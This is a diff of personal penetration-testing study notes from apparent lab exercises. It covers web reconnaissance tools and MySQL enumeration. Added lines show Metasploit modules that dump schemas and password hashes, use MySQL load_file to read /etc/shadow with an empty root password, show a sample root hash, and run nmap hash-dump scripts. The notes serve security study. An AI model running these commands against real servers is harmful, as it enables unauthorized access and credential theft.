@@ -8,7 +8,7 @@ host --> DNS lookup utility find the ip for given domain name
 
 important directories to look for info:
 /robots.txt --> used to specify directories that search engines web crawlers will disregard
-/sitemap.xml --> provides search engines an organised way of indexing a site
+/sitemap.xml --> provides search engines an organised way of indexi ang a site
 
 wappalyzer --> used to see technologies used by site
 whatweb --> tool to see check tech used by sites
@@ -404,7 +404,7 @@ http 10.4.18.97
 #bf the directories
 dirb http://10.4.18.97
 
-#renders the site on command line ??? quite cool
+#renders the site on command line ??? quite cool useful if you dont have browser access
 browsh --startup-url http://10.4.18.97/Default.aspx
 
 #nmap script to enum like dirb but smaller wlist
@@ -477,11 +477,15 @@ mysql -h 192.125.250.3 -u root
 
 Traverse the DBs
 ```Mysql
-show database;
+show databases;
 
 use <database name>;
 show tables
 
+#number of entries in table authour
+select count(*) from authors
+
+#dump all the entries in te table
 select * from <some table name>
 ```
 
@@ -496,20 +500,35 @@ setg rhosts 192.125.250.3
 
 #to see more options
 advanced
+
+#see writable files
+use auxiliary/scanner/mysql/mysql_file_enum
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+
+#dump database schema
+use auxiliary/scanner/mysql/mysql_schemadump
+set username root
+
+
 ```
 Another tool
 dumps users and their pwdhashes
 ```msfconsole
 use auxiliary/scanner/mysql/mysql_hashdump
 
-#impt cos u need to assign it it as nothing
-set password ""
 ```
 
 Mysql tricks 
 note: msf enums before showed that /etc/shadow is a writeable dir so it should load
 ```mysql
+mysql -h 192.1.2.3 -u root
 select load_file("/etc/shadow")
+
+#can see the system pwd hash for users here
+#eg chunk with hash inside
+root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
+#eg hash (not sure how to tell whr it starts/ends from the chunk but oh well)
+S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/
 ```
 
 Nmap enum as usual
@@ -533,7 +552,8 @@ nmap 192.32.122.3 -p 3306 --script=mysql-variables --script-args="mysqluser='roo
 #most impt is the data-dir: /var/lib/mysql shows where the vars are stored
 
 #full check to see if development passes safety
-nmap 192.32.122.3 -p 3306 --script=mysql-audit --script-args="mysqluser='root',mysqlpass='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
+#file privelges etc
+nmap 192.32.122.3 -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
 
 #same hash dump as msf
 nmap 192.32.122.3 -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
